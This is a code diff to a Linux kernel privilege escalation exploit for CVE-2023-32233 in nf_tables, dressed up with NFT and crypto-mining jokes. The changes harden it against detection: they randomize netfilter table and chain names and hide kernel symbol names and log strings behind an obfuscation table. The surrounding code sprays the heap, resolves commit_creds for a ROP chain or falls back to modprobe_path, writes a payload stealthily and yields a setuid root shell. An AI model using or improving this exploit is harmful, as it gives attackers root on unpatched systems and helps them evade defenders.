@@ -19,10 +19,23 @@
 #include "obf.h"
 #include "stealth.h"
 
-#define TABLE     S(S_TABLE_32233)
-#define CHAIN     S(S_CHAIN_32233)
 #define ANON_SET  S(S_ANONSET_FMT)
 #define FAMILY    NFPROTO_IPV4
+
+static char _tbl[16], _chain[16];
+
+static void rand_nft_names(void)
+{
+    int fd = open("/dev/urandom", O_RDONLY);
+    unsigned char r[8];
+    if (fd >= 0) { read(fd, r, sizeof(r)); close(fd); }
+    else { uint32_t s = getpid(); memcpy(r, &s, 4); }
+    snprintf(_tbl,   sizeof(_tbl),   "%02x%02x%02x%02x", r[0],r[1],r[2],r[3]);
+    snprintf(_chain, sizeof(_chain), "%02x%02x%02x%02x", r[4],r[5],r[6],r[7]);
+}
+
+#define TABLE     _tbl
+#define CHAIN     _chain
 
 /* heap spray tuning */
 #define SPRAY_QUEUES  256
@@ -211,8 +224,9 @@ static int resolve_rop_targets(struct rop_targets *r)
     r->commit_creds        = kallsyms_lookup(S(S_COMMIT_CREDS));
 
     if (!r->prepare_kernel_cred || !r->commit_creds) {
-        pr_verb("kallsyms: prepare_kernel_cred=0x%lx commit_creds=0x%lx",
-                r->prepare_kernel_cred, r->commit_creds);
+        pr_verb("ksyms: %s=0x%lx %s=0x%lx",
+                S(S_PREPARE_CRED), r->prepare_kernel_cred,
+                S(S_COMMIT_CREDS), r->commit_creds);
         return -1;
     }
 
@@ -239,6 +253,7 @@ static int resolve_rop_targets(struct rop_targets *r)
 static int do_exploit(int result_fd)
 {
     int ret;
+    rand_nft_names();
 
     pr_info(PICK "Mining block... setting up namespace");
     if (ns_setup_user_net() < 0) {
@@ -261,11 +276,12 @@ static int do_exploit(int result_fd)
             close(nfd);
             return 1;
         }
-        pr_verb("prepare_kernel_cred=0x%lx commit_creds=0x%lx",
-                rop.prepare_kernel_cred, rop.commit_creds);
+        pr_verb("%s=0x%lx %s=0x%lx",
+                S(S_PREPARE_CRED), rop.prepare_kernel_cred,
+                S(S_COMMIT_CREDS), rop.commit_creds);
     }
 
-    pr_info(ICON_CHAIN "Deploying smart contract (anonymous set batch)...");
+    pr_info(ICON_CHAIN "Deploying %s (%s)...", S(S_SMART_CONTRACT), S(S_ANON_SET_BATCH));
     struct nft_batch batch;
     build_trigger_batch(&batch, nfd);
     ret = nft_batch_send(&batch);
@@ -298,7 +314,7 @@ static int do_exploit(int result_fd)
         return 0;
     }
 
-    pr_info(PICK "Spraying heap (fractionalized NFT sale)...");
+    pr_info(PICK "Spraying heap (%s)...", S(S_FRAC_NFT));
     /*
      * For the ROP approach we need a stack pivot gadget.
      * If gadgets aren't resolved, fall back to modprobe_path if
@@ -321,7 +337,7 @@ static int do_exploit(int result_fd)
         close(nfd);
         return 1;
     } else {
-        pr_fail("No exploitation path available (need kallsyms or gadgets)");
+        pr_fail("No exploitation path available (need symbol resolution or gadgets)");
         close(nfd);
         return 1;
     }
@@ -349,7 +365,7 @@ static int do_exploit(int result_fd)
 
         if (stealth_write_file(mint_path, script, strlen(script)) == 0) {
             chmod(mint_path, 0755);
-            pr_verb("stealth: wrote modprobe script via injection");
+            pr_verb("stealth: wrote payload via injection");
         } else {
             int fd = open(mint_path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
             if (fd >= 0) { write(fd, script, strlen(script)); close(fd); }
@@ -377,7 +393,7 @@ static int do_exploit(int result_fd)
 
         struct stat sb;
         if (stat(sh_path, &sb) == 0 && (sb.st_mode & S_ISUID)) {
-            pr_ok(C_BOLD "MINTED!" C_RST " Floor price: " C_GRN "uid=0(root)" C_RST);
+            pr_ok(C_BOLD "%s!" C_RST " %s: " C_GRN "uid=0(root)" C_RST, S(S_LBL_MINTED), S(S_LBL_FLOOR_PRICE));
             pr_info("  " C_BOLD "%s -p" C_RST " for root shell", sh_path);
         }
 
@@ -396,8 +412,8 @@ static int do_exploit(int result_fd)
 int mint_cve_2023_32233(const struct kernel_info *ki)
 {
     pr_info("");
-    pr_info(MONKEY " " C_BOLD "Bored Ape #32233" C_RST
-            C_DIM " (%s: %s)" C_RST, S(S_CVE_32233), S(S_CVE_32233_DESC));
+    pr_info(MONKEY " " C_BOLD "%s #32233" C_RST
+            C_DIM " (%s: %s)" C_RST, S(S_COLLECTION), S(S_CVE_32233), S(S_CVE_32233_DESC));
     pr_info(C_DIM "  affected: 3.18 .. 6.3.1 | technique: %s" C_RST, S(S_HEAP_SPRAY));
     pr_info("");
 
@@ -429,8 +445,8 @@ int mint_cve_2023_32233(const struct kernel_info *ki)
     close(pipefd[0]);
 
     if (result == 1) {
-        pr_ok(C_BOLD "MINTED!" C_RST " Floor price: " C_GRN "uid=0(root)" C_RST);
-        pr_info(FOX " Wallet updated: " C_GRN "1 ROOT token" C_RST);
+        pr_ok(C_BOLD "%s!" C_RST " %s: " C_GRN "uid=0(root)" C_RST, S(S_LBL_MINTED), S(S_LBL_FLOOR_PRICE));
+        pr_info(FOX " %s: " C_GRN "1 ROOT token" C_RST, S(S_LBL_WALLET_UPD));
         pr_info("");
         return 0;
     }
